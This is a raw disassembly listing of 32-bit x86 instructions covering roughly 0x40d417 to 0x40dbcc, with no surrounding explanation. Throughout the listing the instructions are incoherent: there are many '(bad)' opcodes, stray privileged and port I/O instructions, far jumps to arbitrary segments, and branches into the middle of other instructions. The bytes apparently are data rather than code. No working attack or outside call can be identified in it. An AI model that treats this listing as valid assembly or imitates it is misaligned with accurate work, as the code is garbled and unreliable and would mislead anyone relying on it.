  40d417:	add    eax,0x674f8a53
  40d41c:	in     eax,dx
  40d41d:	mov    ah,BYTE PTR [edi-0x29b33805]
  40d423:	jne    0x40d47a
  40d425:	test   BYTE PTR ds:0x53cb7402,bl
  40d42b:	and    esi,ebp
  40d42d:	xor    esp,DWORD PTR [edi]
  40d42f:	ret    0xccdc
  40d432:	cwde   
  40d433:	les    ebx,FWORD PTR [edx]
  40d435:	push   ss
  40d436:	jp     0x40d43c
  40d438:	pop    ebp
  40d439:	rol    BYTE PTR [edi-0x49],0x53
  40d43d:	inc    esp
  40d43e:	adc    DWORD PTR [eax],esi
  40d440:	push   edx
  40d441:	jg     0x40d41a
  40d443:	mov    dh,0xca
  40d445:	in     eax,0xce
  40d447:	in     eax,dx
  40d448:	shl    BYTE PTR ds:0xc7a15896,1
  40d44e:	sti    
  40d44f:	mov    eax,ds:0x5b5e0f48
  40d454:	repnz sbb bh,BYTE PTR [eax]
  40d457:	lea    edx,cs:[ebx+0x42]
  40d45b:	mov    ah,0x50
  40d45d:	and    ebp,DWORD PTR [ebp-0x4c]
  40d460:	inc    edx
  40d461:	or     al,0x3
  40d463:	mov    esi,0xd9790a4f
  40d468:	or     eax,0x5e8870af
  40d46d:	mov    eax,0xa568f67a
  40d472:	scas   eax,DWORD PTR es:[edi]
  40d473:	pop    esi
  40d474:	jmp    0xb8e8:0xeead9d63
  40d47b:	mov    bl,0x31
  40d47d:	test   eax,0x2c308a56
  40d482:	retf   0xb30a
  40d485:	or     al,0x7d
  40d487:	inc    esi
  40d488:	or     eax,0x9aef1a3
  40d48d:	shl    BYTE PTR [eax-0x3d],0x22
  40d491:	mov    ds:0xa36296b4,eax
  40d496:	std    
  40d497:	pop    es
  40d498:	sahf   
  40d499:	idiv   edx
  40d49b:	xchg   edi,eax
  40d49c:	cld    
  40d49d:	xacquire xchg DWORD PTR [edi-0x57],ecx
  40d4a1:	nop
  40d4a2:	dec    ecx
  40d4a3:	and    al,0x6e
  40d4a5:	fsin   
  40d4a7:	aad    0x20
  40d4a9:	and    edx,ecx
  40d4ab:	out    0x24,eax
  40d4ad:	jmp    0x40d490
  40d4af:	dec    esi
  40d4b0:	pusha  
  40d4b1:	loopne 0x40d4e7
  40d4b3:	mov    esi,0x79a8bee3
  40d4b8:	push   eax
  40d4b9:	sub    cl,BYTE PTR [edx+0x46]
  40d4bc:	fsubr  QWORD PTR [edx]
  40d4be:	xchg   BYTE PTR ds:0xb07efa12,ah
  40d4c4:	xor    BYTE PTR ds:0x74851c84,ah
  40d4ca:	popf   
  40d4cb:	sbb    DWORD PTR [ecx-0x2fc61daa],eax
  40d4d1:	and    BYTE PTR [ebx],bh
  40d4d3:	ja     0x40d4cb
  40d4d5:	icebp  
  40d4d6:	or     DWORD PTR [edi-0x6e872ae9],ebp
  40d4dc:	pop    edx
  40d4dd:	fisub  DWORD PTR [ebp-0x13]
  40d4e0:	mov    eax,0xee3916df
  40d4e5:	or     esi,DWORD PTR [edx]
  40d4e7:	scas   al,BYTE PTR es:[edi]
  40d4e8:	push   esi
  40d4e9:	cmp    BYTE PTR [eax+0x1e0a64ff],al
  40d4ef:	jb     0x40d4a6
  40d4f1:	inc    edx
  40d4f2:	push   es
  40d4f3:	into   
  40d4f4:	loope  0x40d4a1
  40d4f6:	(bad)  
  40d4f7:	mov    edi,esi
  40d4f9:	fist   DWORD PTR [esi*1-0x5bfed18d]
  40d500:	and    al,0xc8
  40d502:	xor    DWORD PTR [ecx-0x19328b4b],esi
  40d508:	pop    es
  40d509:	sub    BYTE PTR [ebp+0x4987b728],bl
  40d50f:	loop   0x40d54c
  40d511:	pop    edx
  40d512:	sub    BYTE PTR [esi-0x2ae9297c],bh
  40d518:	cmp    edx,DWORD PTR [ecx+0x6]
  40d51b:	loope  0x40d56d
  40d51d:	call   0xc6aa6b55
  40d522:	mov    eax,0xdc149e3a
  40d527:	pusha  
  40d528:	(bad)  
  40d529:	mov    ah,0xe9
  40d52b:	shl    BYTE PTR [esi],cl
  40d52d:	dec    ebp
  40d52e:	pushf  
  40d52f:	hlt    
  40d530:	enter  0x9558,0x15
  40d534:	add    ebp,DWORD PTR [ebx+0x4d]
  40d537:	and    BYTE PTR [ecx-0x64c10680],bh
  40d53d:	fs jp  0x40d546
  40d540:	cld    
  40d541:	cmc    
  40d542:	lds    ebp,FWORD PTR [eax+0x27536402]
  40d548:	leave  
  40d549:	jge    0x40d590
  40d54b:	xbegin 0x667c4e45
  40d551:	xchg   ebx,eax
  40d552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d553:	xchg   edi,eax
  40d554:	(bad)  
  40d555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d556:	pop    ds
  40d557:	dec    ecx
  40d558:	dec    edi
  40d559:	loop   0x40d50d
  40d55b:	imul   esp,DWORD PTR [edi],0x182db585
  40d561:	(bad)  
  40d562:	push   ebp
  40d563:	rol    BYTE PTR [esi],0x7b
  40d566:	inc    ebp
  40d567:	addr16 xchg ecx,eax
  40d569:	ins    DWORD PTR es:[edi],dx
  40d56a:	dec    ebp
  40d56b:	mov    eax,ds:0xb9e5bcfa
  40d570:	jb     0x40d53c
  40d572:	push   eax
  40d573:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40d575:	mov    WORD PTR ds:0xd5f3577d,ds
  40d57b:	(bad)  
  40d57d:	mov    ch,0xbe
  40d57f:	imul   ebx,eax,0xffffffbd
  40d582:	(bad)  
  40d584:	inc    edx
  40d585:	cmp    ebx,edx
  40d587:	mov    dh,0xc7
  40d589:	sub    ah,BYTE PTR [ebx-0xe]
  40d58c:	sti    
  40d58d:	call   0xa3e9577d
  40d592:	bound  edx,QWORD PTR [ecx]
  40d594:	mov    eax,ds:0xb963513c
  40d599:	repz jne 0x40d60f
  40d59c:	cmp    eax,0x91a0fcc9
  40d5a1:	sub    ecx,DWORD PTR [ebx-0x540e0c81]
  40d5a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5a8:	mov    eax,0x651a3f2
  40d5ad:	jg     0x40d543
  40d5af:	xchg   esi,eax
  40d5b0:	xchg   edx,eax
  40d5b1:	mov    eax,ds:0xea5a64c4
  40d5b6:	mov    ah,0x46
  40d5b8:	push   edi
  40d5b9:	push   ecx
  40d5ba:	sub    DWORD PTR [eax-0x5d],eax
  40d5bd:	xor    esi,DWORD PTR [ebp+0x6ad724c3]
  40d5c3:	mov    ah,0xd9
  40d5c5:	test   ah,cl
  40d5c7:	push   cs
  40d5c8:	out    dx,al
  40d5c9:	add    cl,BYTE PTR [ecx-0x214250e8]
  40d5cf:	push   ebx
  40d5d0:	mov    edx,0x655a333
  40d5d5:	push   esp
  40d5d6:	sub    DWORD PTR [ebp-0x212372f7],esp
  40d5dc:	push   edx
  40d5dd:	fisttp DWORD PTR [edi-0xc]
  40d5e0:	repnz cmp edi,DWORD PTR [esi]
  40d5e3:	inc    edi
  40d5e4:	xchg   BYTE PTR [ebp+0x7f],ah
  40d5e7:	xlat   BYTE PTR ds:[ebx]
  40d5e8:	inc    esi
  40d5e9:	push   0x1a586a06
  40d5ee:	xchg   edi,eax
  40d5ef:	cdq    
  40d5f0:	sbb    DWORD PTR [ebx+0x46801fbe],0x1a
  40d5f7:	les    edi,FWORD PTR [eax+eax*2-0x6f]
  40d5fb:	mov    BYTE PTR [eax+0x46b52705],cl
  40d601:	in     al,dx
  40d602:	mov    edi,0xd06f60c5
  40d607:	sar    DWORD PTR [ebx],1
  40d609:	cmp    esi,DWORD PTR [edx]
  40d60b:	aas    
  40d60c:	aaa    
  40d60d:	das    
  40d60e:	jg     0x40d634
  40d610:	rcr    BYTE PTR [eax+0x4461f03d],0x1a
  40d617:	jecxz  0x40d5ea
  40d619:	sti    
  40d61a:	neg    DWORD PTR [edi-0x51790d7a]
  40d620:	scas   al,BYTE PTR es:[edi]
  40d621:	sub    al,0x56
  40d623:	push   ebx
  40d624:	dec    esp
  40d625:	lahf   
  40d626:	mov    eax,ds:0x2005fdca
  40d62b:	xchg   ebp,eax
  40d62c:	mov    al,0x89
  40d62e:	fcomp  QWORD PTR [edi+eax*8+0x14595813]
  40d635:	cli    
  40d636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d637:	ss mov ebx,0x3a532828
  40d63d:	std    
  40d63e:	jnp    0x40d663
  40d640:	mov    edx,0x63222232
  40d645:	adc    edi,ebp
  40d647:	push   ebp
  40d648:	rcr    ebx,0xca
  40d64b:	xor    eax,0x79c054ce
  40d650:	cmp    DWORD PTR [eax],ebx
  40d652:	push   edi
  40d653:	jb     0x40d5ed
  40d655:	test   DWORD PTR [edi+eax*4],0x35bda765
  40d65c:	cmc    
  40d65d:	(bad)  
  40d65e:	data16 mov ds:0xd605610c,al
  40d664:	daa    
  40d665:	push   ss
  40d666:	in     eax,dx
  40d667:	lock sti 
  40d669:	mov    ds:0x2bd028be,eax
  40d66e:	push   esp
  40d66f:	das    
  40d670:	addr16 sub al,0x10
  40d673:	ror    al,0x5b
  40d676:	das    
  40d677:	fs jbe 0x40d609
  40d67a:	push   0x6dbff1cd
  40d67f:	pop    edi
  40d680:	push   0x193de376
  40d685:	sub    eax,0xc60799ce
  40d68a:	sub    DWORD PTR [ecx+0x6d6ad7a7],edx
  40d690:	cwde   
  40d691:	pop    es
  40d692:	ss call 0x251aeb4
  40d698:	xchg   ebp,eax
  40d699:	lods   al,BYTE PTR ds:[esi]
  40d69a:	cmp    edi,DWORD PTR [edi+0x15]
  40d69d:	retf   
  40d69e:	jbe    0x40d67c
  40d6a0:	(bad)  [edx]
  40d6a2:	pop    edi
  40d6a3:	mov    dh,0x95
  40d6a5:	sbb    dl,0xc0
  40d6a8:	sbb    edx,edx
  40d6aa:	mov    WORD PTR [ecx-0x28c07669],?
  40d6b0:	xor    ah,BYTE PTR [eax+0x6b203f14]
  40d6b6:	popf   
  40d6b7:	fldcw  WORD PTR [ecx-0xe1a6973]
  40d6bd:	nop
  40d6be:	cmp    BYTE PTR [ecx],bh
  40d6c0:	inc    esi
  40d6c1:	xchg   ebx,eax
  40d6c2:	shr    BYTE PTR [esi],0x41
  40d6c5:	adc    ch,BYTE PTR [ebp-0x22554ce4]
  40d6cb:	stos   BYTE PTR es:[edi],al
  40d6cc:	out    0x93,al
  40d6ce:	xchg   esp,eax
  40d6cf:	or     bl,BYTE PTR [edx-0x34]
  40d6d2:	fdivr  QWORD PTR [esi+ebx*4]
  40d6d5:	popa   
  40d6d6:	mov    BYTE PTR [edi+0x3c],bl
  40d6d9:	out    0x30,eax
  40d6db:	sub    DWORD PTR [edx-0x47ce0684],edx
  40d6e1:	cld    
  40d6e2:	and    BYTE PTR [ebp-0x6b577978],al
  40d6e8:	clc    
  40d6e9:	mov    ds:0x8e56f18,eax
  40d6ee:	add    eax,0xec6d98f7
  40d6f3:	out    dx,eax
  40d6f4:	push   esi
  40d6f5:	sub    al,0x73
  40d6f7:	adc    BYTE PTR [eax+edx*2+0x3a712e62],bl
  40d6fe:	fs adc dh,BYTE PTR ss:[ecx]
  40d702:	mov    al,ds:0xd1fff6c1
  40d707:	mov    DWORD PTR [ebx],ebp
  40d709:	add    eax,ebp
  40d70b:	std    
  40d70c:	mov    ah,0xaa
  40d70e:	fidiv  DWORD PTR [ecx-0x30ca764f]
  40d714:	sub    al,0xd7
  40d716:	out    dx,eax
  40d717:	jb     0x40d70f
  40d719:	ror    eax,1
  40d71b:	int3   
  40d71c:	cs into 
  40d71e:	ret    
  40d71f:	stos   BYTE PTR es:[edi],al
  40d720:	mov    cl,0x6a
  40d722:	pop    eax
  40d723:	mov    ecx,DWORD PTR [eax-0x240e91c3]
  40d729:	xchg   dl,dh
  40d72b:	ficomp DWORD PTR [edx-0x2d]
  40d72e:	or     DWORD PTR [ebp+0x1e],0x58
  40d732:	dec    edi
  40d733:	jo     0x40d78d
  40d735:	xor    eax,0xbbd8558e
  40d73a:	push   ebp
  40d73b:	pop    edx
  40d73c:	xchg   ebp,eax
  40d73d:	cmp    al,BYTE PTR [eax-0x26]
  40d740:	rcl    bh,1
  40d742:	cwde   
  40d743:	sbb    DWORD PTR [edi+0x3ed7b3aa],0xffffffc4
  40d74a:	pusha  
  40d74b:	mov    bl,0xb3
  40d74d:	js     0x40d6fe
  40d74f:	push   ebx
  40d750:	cmp    al,0x5d
  40d752:	fsub   DWORD PTR ds:0xd08dbfcf
  40d758:	push   es
  40d759:	call   0xf6c7d079
  40d75e:	sbb    al,0x31
  40d760:	add    BYTE PTR [esi-0x6a18a1a7],ah
  40d766:	shr    BYTE PTR [ebp+0x70],1
  40d769:	cli    
  40d76a:	ror    al,1
  40d76c:	out    dx,eax
  40d76d:	xor    al,0x96
  40d76f:	xchg   esp,eax
  40d770:	(bad)  
  40d772:	cmp    al,0x65
  40d774:	les    esp,FWORD PTR [eax]
  40d776:	ret    
  40d777:	hlt    
  40d778:	retf   0xe957
  40d77b:	mov    ebx,?
  40d77d:	pop    ds
  40d77e:	fadd   QWORD PTR [ebp+0x6250e88]
  40d784:	inc    ecx
  40d785:	cmp    ah,BYTE PTR [eax]
  40d787:	push   ss
  40d788:	or     eax,0xa9c66533
  40d78d:	or     al,0xa8
  40d78f:	and    bh,BYTE PTR [edi]
  40d791:	hlt    
  40d792:	mov    edi,DWORD PTR [ebx+ebp*1+0x32a35833]
  40d799:	ins    DWORD PTR es:[edi],dx
  40d79a:	xor    bl,ah
  40d79c:	inc    ebx
  40d79d:	jp     0x40d754
  40d79f:	in     eax,0x9c
  40d7a1:	inc    esp
  40d7a2:	(bad)  
  40d7a3:	icebp  
  40d7a4:	mov    dl,0x78
  40d7a6:	aam    0x12
  40d7a8:	mov    al,0x53
  40d7aa:	nop
  40d7ab:	mov    dh,0xfe
  40d7ad:	test   DWORD PTR [ebx-0x52],esi
  40d7b0:	sbb    BYTE PTR [edi+0x5ef9caec],ah
  40d7b6:	ds and eax,0xaefec24d
  40d7bc:	test   eax,0xb5579447
  40d7c1:	cmc    
  40d7c2:	add    eax,0xf50ebe5c
  40d7c7:	popf   
  40d7c8:	pop    ds
  40d7c9:	test   al,0x2d
  40d7cb:	repz out dx,eax
  40d7cd:	(bad)  
  40d7ce:	mov    cl,0xb1
  40d7d0:	add    cl,ch
  40d7d2:	mov    ch,0xd1
  40d7d4:	arpl   WORD PTR [edx-0x55],di
  40d7d7:	dec    eax
  40d7d8:	xlat   BYTE PTR ds:[ebx]
  40d7d9:	jnp    0x40d840
  40d7db:	arpl   si,ax
  40d7dd:	dec    ebx
  40d7de:	mov    dh,0xa1
  40d7e0:	cmp    al,0x4f
  40d7e2:	sbb    al,ch
  40d7e4:	aas    
  40d7e5:	pop    esp
  40d7e6:	and    al,0x5f
  40d7e8:	and    eax,0xf7e018a4
  40d7ed:	mov    al,ds:0xdabb2fa1
  40d7f2:	gs stc 
  40d7f4:	mov    edi,esp
  40d7f6:	pop    edx
  40d7f7:	and    BYTE PTR [eax+ebx*1-0x1c],bh
  40d7fb:	aas    
  40d7fc:	xchg   edx,eax
  40d7fd:	ds out 0x42,eax
  40d800:	add    esp,DWORD PTR [ecx-0x75]
  40d803:	sahf   
  40d804:	mov    ah,dl
  40d806:	xor    eax,0xda14f319
  40d80b:	add    cl,BYTE PTR [eax+ebx*1-0x41561885]
  40d812:	and    DWORD PTR [esi],esp
  40d814:	xchg   ebp,eax
  40d815:	sub    dl,BYTE PTR [ebx]
  40d817:	cld    
  40d818:	push   edi
  40d819:	and    eax,0x55be38cf
  40d81e:	xchg   esi,eax
  40d81f:	or     eax,0x1e19f32e
  40d824:	mov    eax,ds:0x82df6b9b
  40d829:	lods   eax,DWORD PTR ds:[esi]
  40d82a:	ss sub eax,esi
  40d82d:	mov    eax,0x472c996e
  40d832:	jne    0x40d827
  40d834:	lahf   
  40d835:	xor    BYTE PTR [ecx+ecx*1+0x5381c6e6],ch
  40d83c:	xor    al,0x9
  40d83e:	fst    QWORD PTR [esi+edi*8]
  40d841:	test   eax,0x80518725
  40d846:	push   ss
  40d847:	clc    
  40d848:	mov    eax,0xdb00d1dd
  40d84d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d84f:	test   BYTE PTR [edx-0x66],bl
  40d852:	lods   al,BYTE PTR ds:[esi]
  40d853:	dec    ebx
  40d854:	mov    ebp,0xf80fd82
  40d859:	pusha  
  40d85a:	xor    DWORD PTR [ecx+edi*8-0x44],esi
  40d85e:	(bad)  
  40d85f:	in     eax,dx
  40d860:	pop    edi
  40d861:	scas   al,BYTE PTR es:[edi]
  40d862:	out    dx,eax
  40d863:	adc    eax,0x6836b6f0
  40d868:	mov    dh,BYTE PTR [esi-0x75]
  40d86b:	fcmovu st,st(2)
  40d86d:	cmp    ebp,edi
  40d86f:	xlat   BYTE PTR ds:[ebx]
  40d870:	sbb    bh,ch
  40d872:	(bad)  
  40d873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d874:	cs data16 jo 0x40d889
  40d878:	mov    edi,0x861e6756
  40d87d:	scas   al,BYTE PTR es:[edi]
  40d87e:	mov    WORD PTR [esi+0x35c516bb],cs
  40d884:	xor    al,0x72
  40d886:	push   edx
  40d887:	scas   al,BYTE PTR es:[edi]
  40d888:	fild   QWORD PTR [eax-0x28]
  40d88b:	mov    dl,0x51
  40d88d:	adc    BYTE PTR [edi-0x6b],bl
  40d890:	mov    ecx,0x2e87662
  40d895:	cli    
  40d896:	mul    DWORD PTR [eax-0xf]
  40d899:	nop
  40d89a:	popf   
  40d89b:	and    dh,BYTE PTR [ebx+ecx*8+0x478ad470]
  40d8a2:	adc    ch,BYTE PTR ds:0x4f7c6958
  40d8a8:	repz cmp esi,DWORD PTR [edx-0x8a5590b]
  40d8af:	jbe    0x40d8da
  40d8b1:	add    bh,BYTE PTR [edx]
  40d8b3:	adc    esi,DWORD PTR [edx-0x382d4c54]
  40d8b9:	cmp    al,0x3b
  40d8bb:	and    al,0xe0
  40d8bd:	(bad)
  40d8c0:	cmp    esi,DWORD PTR [ecx-0x56]
  40d8c3:	and    esi,DWORD PTR [esi-0x392fc82b]
  40d8c9:	lahf   
  40d8ca:	jnp    0x40d887
  40d8cc:	(bad)  
  40d8ce:	and    al,0xcf
  40d8d0:	int    0x4
  40d8d2:	pop    di
  40d8d4:	pop    edx
  40d8d5:	mov    ebx,0x228c8d7d
  40d8da:	call   0x6361c42e
  40d8df:	rcr    BYTE PTR [ebp+esi*8+0x7d],0x4e
  40d8e4:	and    eax,0xbd73bc57
  40d8e9:	hlt    
  40d8ea:	push   ecx
  40d8eb:	xor    BYTE PTR ds:0x4ca54dd7,dh
  40d8f1:	mov    dl,BYTE PTR [edx+ecx*1-0x5b]
  40d8f5:	add    BYTE PTR [eax-0x7ee30a77],al
  40d8fb:	sbb    ebp,ebx
  40d8fd:	call   0x39e632cd
  40d902:	stos   DWORD PTR es:[edi],eax
  40d903:	mov    ds:0x75eeabc8,al
  40d908:	int3   
  40d909:	aaa    
  40d90a:	adc    ch,BYTE PTR [ecx+ecx*8-0x454fbfd]
  40d911:	mov    ah,0xde
  40d913:	daa    
  40d914:	mov    ch,bh
  40d916:	test   al,0xfc
  40d919:	int3   
  40d91a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d91b:	or     BYTE PTR [edi-0x2f],0x47
  40d91f:	in     eax,dx
  40d920:	sahf   
  40d921:	or     al,0x1c
  40d923:	push   esi
  40d924:	je     0x40d989
  40d926:	add    dh,dl
  40d928:	pushw  0x46
  40d92b:	push   ecx
  40d92c:	sbb    cl,BYTE PTR [ebx-0x4e]
  40d92f:	pop    ss
  40d930:	test   BYTE PTR [ecx],dl
  40d932:	jg     0x40d96f
  40d934:	dec    edx
  40d935:	jmp    0x40d930
  40d937:	xchg   edi,eax
  40d938:	dec    edi
  40d939:	ins    DWORD PTR es:[edi],dx
  40d93a:	xor    eax,0x2234028b
  40d93f:	aaa    
  40d940:	mov    eax,ss
  40d942:	xor    DWORD PTR ds:0xf19ddc21,eax
  40d948:	or     eax,0x814facb2
  40d94d:	pop    es
  40d94e:	mov    ebx,0xd075f165
  40d953:	inc    bh
  40d955:	call   0x1ba70533
  40d95a:	sti    
  40d95b:	mov    bl,0x13
  40d95d:	mov    ecx,0x8f021690
  40d962:	es mov esp,0x6a8a6ab
  40d968:	jmp    0xbbf:0x921f0ff5
  40d96f:	pop    es
  40d970:	imul   eax,DWORD PTR [edi],0xc7e36d67
  40d976:	mov    ss,WORD PTR [esi-0x28]
  40d979:	addr16 (bad) 
  40d97b:	push   ss
  40d97c:	jb     0x40d9ee
  40d97e:	dec    esp
  40d97f:	fimul  DWORD PTR [ecx+0x5f]
  40d982:	sbb    DWORD PTR [ebp+0x2d61242],0x78f02c95
  40d98c:	pop    esi
  40d98d:	scas   al,BYTE PTR es:[edi]
  40d98e:	retf   0xa383
  40d991:	(bad)  [eax+0x51]
  40d994:	mov    edx,0xb80cc582
  40d999:	push   eax
  40d99a:	ret    
  40d99b:	mov    al,BYTE PTR [ebp+0x25]
  40d99e:	mov    BYTE PTR [eax],ah
  40d9a0:	pop    ebp
  40d9a1:	pusha  
  40d9a2:	idiv   edi
  40d9a4:	lahf   
  40d9a5:	sti    
  40d9a6:	or     eax,0x9c0a0e46
  40d9ab:	(bad)  
  40d9ac:	retf   0xe419
  40d9af:	pusha  
  40d9b0:	(bad)  
  40d9b1:	stos   BYTE PTR es:[edi],al
  40d9b2:	inc    edi
  40d9b3:	mul    DWORD PTR [esp+eax*4+0x27]
  40d9b7:	je     0x40d97e
  40d9b9:	ss popa 
  40d9bb:	daa    
  40d9bc:	mov    ebx,0x33b2396e
  40d9c1:	add    BYTE PTR [edi],cl
  40d9c3:	add    al,0x3
  40d9c5:	shl    BYTE PTR [esi-0x20110efd],0x4e
  40d9cc:	mov    ecx,DWORD PTR [eax+0x2c661ef9]
  40d9d2:	leave  
  40d9d3:	test   eax,0x481bf51f
  40d9d8:	out    dx,al
  40d9d9:	shl    BYTE PTR [esi+0x51],cl
  40d9dc:	inc    eax
  40d9dd:	je     0x40da01
  40d9df:	jns    0x40d9d4
  40d9e1:	xchg   ebp,eax
  40d9e2:	add    BYTE PTR [ecx+edi*2+0x4de0dbbe],ch
  40d9e9:	je     0x40d9a6
  40d9eb:	mov    edx,0xe60ac050
  40d9f0:	or     al,0xf
  40d9f2:	xchg   ebp,eax
  40d9f3:	outs   dx,BYTE PTR ds:[esi]
  40d9f4:	inc    eax
  40d9f5:	dec    BYTE PTR ds:0xf437aac1
  40d9fb:	cwde   
  40d9fc:	pop    edi
  40d9fd:	jg     0x40da7a
  40d9ff:	mov    ah,0xad
  40da01:	dec    edx
  40da02:	sbb    eax,esi
  40da04:	adc    DWORD PTR [ebx-0x605d1237],0xffffffae
  40da0b:	mov    DWORD PTR [ebp-0x6fc284ce],ecx
  40da11:	pop    esp
  40da12:	imul   esi,DWORD PTR [esi-0x22],0x3d
  40da16:	in     eax,dx
  40da17:	xor    al,0x71
  40da19:	std    
  40da1a:	xchg   ebx,eax
  40da1b:	pop    esp
  40da1c:	add    al,0xd8
  40da1e:	jmp    0x8067c693
  40da23:	mov    ds:0x607ed5c8,eax
  40da28:	push   cs
  40da29:	add    cl,dh
  40da2b:	mov    eax,0x798a6208
  40da30:	sbb    al,0xa9
  40da32:	mov    bh,0x53
  40da34:	jae    0x40d9e9
  40da36:	push   eax
  40da37:	jle    0x40da7a
  40da39:	xchg   esi,eax
  40da3a:	sub    BYTE PTR [esi+0x62],ah
  40da3d:	push   ebx
  40da3e:	sbb    esp,DWORD PTR [edi-0x531f3f87]
  40da44:	mov    ds:0x723d9875,eax
  40da49:	(bad)  [edi+ecx*1+0x12]
  40da4d:	xor    ah,ch
  40da4f:	mov    ebp,0xa6af4c78
  40da54:	sub    DWORD PTR [esi+esi*1],0xe996d8b3
  40da5b:	push   es
  40da5c:	dec    ebx
  40da5d:	inc    esi
  40da5e:	popa   
  40da5f:	jmp    0x40da91
  40da61:	xchg   edx,eax
  40da62:	jne    0x40da31
  40da64:	dec    esp
  40da65:	jge    0x40da38
  40da67:	(bad)
  40da6a:	bound  ebx,QWORD PTR [edi]
  40da6c:	int3   
  40da6d:	push   0xbe479267
  40da72:	jmp    0x40da9c
  40da74:	pusha  
  40da75:	xchg   BYTE PTR [edx-0x274506ed],dh
  40da7b:	gs dec esp
  40da7d:	pop    ebx
  40da7e:	je     0x40dab7
  40da80:	xorps  xmm5,XMMWORD PTR [esi+ecx*2+0x1d]
  40da85:	xchg   ebp,eax
  40da86:	fsub   st,st(6)
  40da88:	mov    eax,DWORD PTR [ecx-0x2a]
  40da8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da8c:	jl     0x40da15
  40da8e:	add    al,0xbe
  40da90:	or     dh,BYTE PTR [eax+ecx*2+0x58d3e8b5]
  40da97:	jns    0x40da31
  40da99:	mov    ds:0xc648cf8b,eax
  40da9e:	(bad)  
  40da9f:	(bad)  
  40daa0:	dec    ebp
  40daa1:	xchg   BYTE PTR [edx],cl
  40daa3:	sub    DWORD PTR [eax],eax
  40daa5:	push   0xffffffe5
  40daa7:	sbb    al,0xe7
  40daa9:	xor    bh,dl
  40daab:	data16 cmp ch,BYTE PTR [ebp+0x62]
  40daaf:	adc    al,0x40
  40dab1:	call   0x6d85:0xd6a24dc6
  40dab8:	inc    ecx
  40dab9:	sbb    eax,esp
  40dabb:	fild   WORD PTR [edi+0x77acd568]
  40dac1:	mul    BYTE PTR [esp+edx*4+0x4d]
  40dac5:	dec    esp
  40dac6:	mov    edi,0xc803ac46
  40dacb:	iret   
  40dacc:	hlt    
  40dacd:	or     ebx,DWORD PTR [ebx]
  40dacf:	adc    ch,bl
  40dad1:	xor    ah,BYTE PTR [edi+0x23eb3852]
  40dad7:	and    DWORD PTR [edi],ebx
  40dad9:	imul   edx,DWORD PTR [ecx+0x63],0xfffffff5
  40dadd:	sub    cl,BYTE PTR [edx-0x76016d1e]
  40dae3:	dec    eax
  40dae4:	cmp    bh,bh
  40dae6:	mov    ch,0xb4
  40dae8:	xchg   ecx,eax
  40dae9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daea:	arpl   ax,di
  40daec:	or     eax,0x1fe72386
  40daf1:	in     al,dx
  40daf2:	add    al,0x49
  40daf4:	push   edi
  40daf5:	aad    0x47
  40daf7:	push   ebx
  40daf8:	fadd   QWORD PTR [edx-0x2d6f477c]
  40dafe:	ins    DWORD PTR es:[edi],dx
  40daff:	mov    ah,0xf8
  40db01:	ret    0xbae
  40db04:	xlat   BYTE PTR ds:[ebx]
  40db05:	mov    dl,0x39
  40db07:	adc    DWORD PTR [edx],ebx
  40db09:	inc    ecx
  40db0a:	jmp    0xf79b:0xc8926daa
  40db11:	push   es
  40db12:	inc    esp
  40db13:	dec    ecx
  40db14:	push   edi
  40db15:	out    dx,eax
  40db16:	mov    eax,0xfaf4d1d6
  40db1b:	mov    bl,BYTE PTR [ecx+0x19]
  40db1e:	sub    eax,0x7171f1b7
  40db23:	gs jmp 0x60536167
  40db29:	std    
  40db2a:	mov    ds:0x30f3dd40,eax
  40db2f:	fwait
  40db30:	or     BYTE PTR [ecx],dh
  40db32:	push   ds
  40db33:	stos   DWORD PTR es:[edi],eax
  40db34:	push   esi
  40db35:	addr16 cld 
  40db37:	out    0x57,eax
  40db39:	or     al,0xac
  40db3b:	mov    BYTE PTR [edx],dh
  40db3d:	mov    ah,0xd9
  40db3f:	(bad)  
  40db40:	mov    dl,0x66
  40db42:	or     cl,BYTE PTR [eax+0x7fcd497]
  40db48:	add    esp,DWORD PTR [ecx+edi*4]
  40db4b:	(bad)  [edi]
  40db4d:	(bad)  
  40db4e:	xor    ah,dl
  40db50:	(bad)  
  40db51:	(bad)  
  40db52:	gs jae 0x40db4a
  40db55:	adc    al,0x30
  40db57:	xor    eax,0x6fcc118b
  40db5c:	mov    dl,0xc2
  40db5e:	xchg   DWORD PTR [ebp+0x49f125f8],eax
  40db64:	les    ebx,FWORD PTR [edx-0x37315838]
  40db6a:	ins    BYTE PTR es:[edi],dx
  40db6b:	jecxz  0x40dbc6
  40db6d:	outs   dx,BYTE PTR ds:[esi]
  40db6e:	out    dx,eax
  40db6f:	jb     0x40dbdc
  40db71:	xor    eax,0x2a0a77b1
  40db76:	repnz in eax,0xc9
  40db79:	js     0x40db27
  40db7b:	mov    edx,0x72c521f
  40db80:	sar    DWORD PTR [esi+0x7a],0x50
  40db84:	cdq    
  40db85:	inc    ebp
  40db86:	div    BYTE PTR [edi-0x2f]
  40db89:	mov    dl,BYTE PTR [edx]
  40db8b:	add    al,0x0
  40db8d:	push   ecx
  40db8e:	push   eax
  40db8f:	add    bl,BYTE PTR [edi]
  40db91:	pusha  
  40db92:	imul   ebp,DWORD PTR [ebx+0x15],0xc826dce6
  40db99:	push   es
  40db9a:	xor    al,0x96
  40db9c:	lea    ebx,[edx+0x301eb0a5]
  40dba2:	ror    DWORD PTR [ebx+0x50],0x11
  40dba6:	jbe    0x40db3b
  40dba8:	ins    BYTE PTR es:[edi],dx
  40dba9:	test   BYTE PTR [edx],bl
  40dbab:	jno    0x40db76
  40dbad:	fstp   DWORD PTR [ecx-0x67]
  40dbb0:	lds    edi,FWORD PTR [eax+ebp*1+0x5fbaf7a9]
  40dbb7:	outs   dx,BYTE PTR ds:[esi]
  40dbb8:	xor    ah,BYTE PTR [ebx+eiz*2+0x2a]
  40dbbc:	mov    edx,0x5c1abeee
  40dbc1:	out    0x45,eax
  40dbc3:	mov    bh,0xde
  40dbc5:	cmp    ecx,DWORD PTR [edx+0x4]
  40dbc8:	xor    BYTE PTR [ebx-0x19],0x46
  40dbcc:	push   es
